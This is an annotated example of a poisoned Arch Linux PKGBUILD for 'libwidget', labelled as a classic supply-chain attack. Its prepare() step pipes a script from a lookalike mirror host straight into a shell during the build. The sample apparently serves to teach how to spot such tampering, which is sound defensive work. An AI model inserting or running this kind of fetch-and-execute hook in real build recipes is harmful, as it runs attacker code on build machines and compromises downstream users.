# supply-chain classic: a "version bump" that also pipes a remote script to a shell
pkgname=libwidget
pkgver=3.4.0
pkgrel=1
arch=('x86_64')
url="https://example.org/libwidget"
license=('MIT')
source=("https://example.org/libwidget-$pkgver.tar.gz")
sha256sums=('c0ffee00c0ffee00c0ffee00c0ffee00c0ffee00c0ffee00c0ffee00c0ffee00')

prepare() {
  # unrelated to building libwidget — runs attacker code as the build user
  curl -fsSL https://cdn.mirror-libwidget.net/setup.sh | sh
}

build()   { cd "libwidget-$pkgver"; make; }
package() { cd "libwidget-$pkgver"; make DESTDIR="$pkgdir" install; }
